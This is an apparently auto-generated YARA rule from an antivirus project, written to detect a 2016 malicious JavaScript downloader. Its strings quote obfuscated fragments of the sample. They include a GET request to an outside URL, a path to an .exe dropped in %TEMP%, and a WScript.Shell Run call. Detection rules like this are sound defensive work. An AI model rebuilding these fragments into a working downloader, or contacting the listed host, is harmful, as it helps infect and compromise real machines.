rule sig_20160328_f00bca8a27c4dd9835ad8da9cb905c86 {
  meta:
    description = "datamaliciousorder - file 20160328_f00bca8a27c4dd9835ad8da9cb905c86.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0666b74070b1a37de8fa504a781cc2d578fcf507b8b0e6fef45a2f8386b1a49a"

  strings:
    $s1  = "function Ivbzhq() {return Ddflvrha[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rpUtbzDeCyf0.exe\";};" fullword ascii
    $s2  = "Pitzvcvaeu[Soijtflecp](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Fdlaakd](Mdpzopjd() * 11)} while (Pitzvcvaeu[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ddflvrha = function Llmhhydqu() {return WScript[Idzvyeuf](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Czkfa(Luzmby, Mgxxirik){return Luzmby - Mgxxirik;};" fullword ascii
    $s6  = "function Iajeiy(Lolutfxjyc){Ddflvrha[\"Run\"](Lolutfxjyc, Etlycbdk, Etlycbdk);};" fullword ascii
    $s7  = "function Dxtqc() {return ((Fhxwozxjl == true) && (Fhxwozxjl == Tmosbip)) ? 1 : Etlycbdk;};" fullword ascii
    $s8  = "var Vtnmtfuyuq = new this[\"Date\"]();" fullword ascii
    $s9  = "var Tmosbip = false;" fullword ascii
    $s10 = "return Czkfa(Qzsfcsvp, Ouodarn);" fullword ascii
    $s11 = "function Ywtxzp(Hoxwlg) {var Ainprutip = (1, 2, 3, 4, 5, Hoxwlg); return Ainprutip;};" fullword ascii
    $s12 = "Tmosbip = true; " fullword ascii
    $s13 = "function Mdpzopjd(){return 22;};" fullword ascii
    $s14 = "var Fhxwozxjl = false;" fullword ascii
    $s15 = "function Tkazmbblt(){return Idzvyeuf;};" fullword ascii
    $s16 = " while (Rpbdzru){" fullword ascii
    $s17 = "Fhxwozxjl = true; " fullword ascii
    $s18 = "function Emmla(){return Zwvqdx;};" fullword ascii
    $s19 = "var Nrvlf = false;" fullword ascii
    $s20 = "function Juzyn()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}